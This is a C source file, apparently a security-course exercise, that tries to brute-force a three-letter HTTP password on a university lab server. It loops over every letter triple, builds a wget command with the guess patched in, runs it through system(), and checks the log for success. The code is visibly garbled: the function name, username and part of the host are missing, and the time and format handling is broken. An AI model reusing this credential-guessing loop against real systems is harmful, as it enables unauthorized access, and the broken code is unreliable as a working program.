# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <sys/time.h>
# include <strings.h>

int ()
{

		
	char* check = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";		
	char s[100];
	char charcopy[200];
	
	FILE* f;					
		
	int i,j,k;

	int starting,ending;							
	
	int totaltime;
	
	starting=time();								

	for (i=0;i<strlen(check);i++)
	{
		for(j=0;j<strlen(check);j++)						
		{
			for(k=0;k<strlen(check);k++)
			{
				strcpy(charcopy,"wget --http-user= --http-passwd=    -nv -o logfile http://sec-crack.cs.rmit.edu./SEC/2/");
				
				
				
				
				charcopy[40]=check[i];              			
				charcopy[41]=check[j];					
				charcopy[42]=check[k];
												
				system(charcopy);	
				printf("%c %c %c\n",check[i],check[j],check[k]);
				printf("%s\n",charcopy);
				
				f = fopen("logfile","r");				
				
				if(f != (FILE*) NULL)
				{
					fgets(s,30,f);					
					printf("%s\n",s);
					if(strcmp(s,"Authorization failed.\n")!=0)
					{
						ending=time();	
						totaltime=ending-starting;
						totaltime=totaltime/1000000000;		
						totaltime=totaltime/60;
	
						printf("Total time_var taken  break the Password is %lld minutes\n", totaltime);
						exit(0);
					}
				}
				
				fclose(f);						
			}
		}
	} 
	
	
	return 1;
}
